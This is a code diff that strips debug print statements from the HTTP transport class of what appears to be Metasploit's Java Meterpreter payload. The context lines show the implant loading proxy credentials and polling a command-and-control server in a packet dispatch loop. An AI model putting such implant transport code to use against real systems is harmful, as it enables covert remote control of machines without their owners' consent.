@@ -46,7 +46,6 @@ public class HttpTransport extends Transport {
               + this.targetUrl.getHost() + ":"
               + this.targetUrl.getPort()
               + uri;
-            System.out.println("msf : New url is: " + newUrl);
             this.nextUrl = new URL(newUrl);
             return true;
         }
@@ -60,19 +59,15 @@ public class HttpTransport extends Transport {
 
         this.proxy = Meterpreter.readString(configuration, offset, PROXY_HOST_LEN);
         offset += PROXY_HOST_LEN;
-        System.out.println("msf : Proxy: " + this.proxy);
 
         this.proxyUser = Meterpreter.readString(configuration, offset, PROXY_USER_LEN);
         offset += PROXY_USER_LEN;
-        System.out.println("msf : Proxy User: " + this.proxyUser);
 
         this.proxyPass = Meterpreter.readString(configuration, offset, PROXY_PASS_LEN);
         offset += PROXY_PASS_LEN;
-        System.out.println("msf : Proxy Pass: " + this.proxyPass);
 
         this.userAgent = Meterpreter.readString(configuration, offset, UA_LEN);
         offset += UA_LEN;
-        System.out.println("msf : User agent: " + this.userAgent);
 
         this.certHash = null;
         byte[] loadedHash = Meterpreter.readBytes(configuration, offset, CERT_HASH_LEN);
@@ -133,7 +128,6 @@ public class HttpTransport extends Transport {
     }
 
     protected boolean tryConnect(Meterpreter met) throws IOException {
-        System.out.println("msf : attempting to read packet on reconnect");
         URLConnection conn = this.createConnection();
 
         if (conn == null) {
@@ -172,7 +166,6 @@ public class HttpTransport extends Transport {
     }
 
     public TLVPacket readPacket() throws IOException {
-        System.out.println("msf : packet read");
         URLConnection conn = this.createConnection();
 
         if (conn == null) {
@@ -199,7 +192,6 @@ public class HttpTransport extends Transport {
     }
 
     public void writePacket(TLVPacket packet, int type) throws IOException {
-        System.out.println("msf : packet write");
         URLConnection conn = this.createConnection();
 
         if (conn == null) {
@@ -230,19 +222,16 @@ public class HttpTransport extends Transport {
     }
 
     public boolean dispatch(Meterpreter met) {
-        System.out.println("msf : In the dispatch loop");
         long lastPacket = System.currentTimeMillis();
         long ecount = 0;
 
         while (!met.hasSessionExpired() &&
             System.currentTimeMillis() < lastPacket + this.commTimeout) {
             try {
-                System.out.println("msf : Waiting for packet");
                 TLVPacket request = this.readPacket();
 
                 if (request != null) {
                     ecount = 0;
-                    System.out.println("msf : Packet received");
 
                     // got a packet, update the timestamp
                     lastPacket = System.currentTimeMillis();
@@ -264,7 +253,6 @@ public class HttpTransport extends Transport {
                 }
             } catch (Exception ex) {
                 // any other type of exception isn't good.
-                System.out.println("msf : Some other exception: " + ex.getClass().getName());
                 break;
             }
 
